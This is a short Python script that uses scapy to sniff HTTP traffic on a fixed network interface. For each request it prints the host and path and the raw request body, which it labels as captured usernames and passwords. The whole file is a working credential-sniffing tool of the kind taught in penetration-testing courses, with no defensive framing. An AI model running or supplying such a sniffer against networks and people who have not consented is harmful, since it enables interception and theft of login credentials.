import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface = interface, store = False, prn = packet_detail)

def packet_detail(packet):
	if packet.haslayer(http.HTTPRequest):
		if packet.haslayer(scapy.Raw):
			print('')
			print('#### DETECT PACKET #####')
			url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
			print("[+] URL => ")
			print(str(url))
			print("[+] Username/password =>")
			print(str(packet[scapy.Raw].load))
			print('########################')
			print('')

sniff('enx3c18a011e9bc')